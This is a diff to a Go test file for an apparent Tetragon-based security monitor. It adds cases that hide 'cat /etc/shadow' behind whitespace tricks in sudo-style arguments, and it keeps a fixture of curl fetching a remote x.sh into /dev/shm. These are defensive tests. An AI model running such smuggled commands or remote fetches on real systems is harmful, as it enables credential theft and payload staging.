@@ -2,6 +2,32 @@ package tetragon
 
 import "testing"
 
+func TestArgvBoundariesTrusted(t *testing.T) {
+	tests := []struct {
+		name      string
+		arguments string
+		want      bool
+	}{
+		{name: "plain tokens", arguments: "-u root sysarmorctl policy current", want: true},
+		{name: "quoted space", arguments: `-p "notice sysarmorctl tail" cat /etc/shadow`},
+		{name: "tab", arguments: "-p notice\tsysarmorctl cat /etc/shadow"},
+		{name: "vertical tab", arguments: "-p notice\vsysarmorctl cat /etc/shadow"},
+		{name: "form feed", arguments: "-p notice\fsysarmorctl cat /etc/shadow"},
+		{name: "non-breaking space", arguments: "-p notice\u00a0sysarmorctl cat /etc/shadow"},
+		{name: "newline", arguments: "-p notice\nsysarmorctl cat /etc/shadow"},
+		{name: "repeated spaces", arguments: "-u  root sysarmorctl"},
+		{name: "leading space", arguments: " sysarmorctl"},
+		{name: "backslash", arguments: `-p notice\ sysarmorctl`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := argvBoundariesTrusted(tt.arguments); got != tt.want {
+				t.Fatalf("argvBoundariesTrusted(%q) = %t, want %t", tt.arguments, got, tt.want)
+			}
+		})
+	}
+}
+
 func TestParseProcessExecInfersCurlWrite(t *testing.T) {
 	raw := []byte(`{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`)
 	events, ok := ParseLine(raw)
